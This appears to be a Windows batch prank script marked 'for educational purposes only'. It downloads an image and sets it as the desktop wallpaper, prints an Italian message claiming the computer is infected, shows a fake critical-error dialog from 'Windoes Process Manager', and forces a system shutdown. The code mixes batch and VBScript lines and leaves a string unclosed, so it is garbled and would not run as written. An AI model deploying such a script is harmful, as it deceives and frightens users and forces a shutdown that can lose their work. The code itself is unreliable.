@echo off
set IMG_URL=https://i.ytimg.com/vi/tzD9OxAHtzU/hq720_2.jpg
:: NOTE! FOR EDUCATIONAL PURPOSES ONLY
powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"
:2
echo "ciao il tuo computer è stato infetto"
echo tocca un tasto per continure
pause

echo speech.speak "%text%" >> "speech.vbs"
Set objShell = CreateObject("WScript.Shell")
MsgBox "A critical error has occurred." & vbCrLf & vbCrLf & _
       "The system cannot locate file abc123.dll due to corruption." & vbCrLf & _
       "Windows will attempt to restore the file on restart." & vbCrLf & vbCrLf & _
       "System will restart in 30 seconds.", vbCritical, "Windoes Process Manager"
objShell.Run "shutdown -s -t 30
shutdown /s /t 5

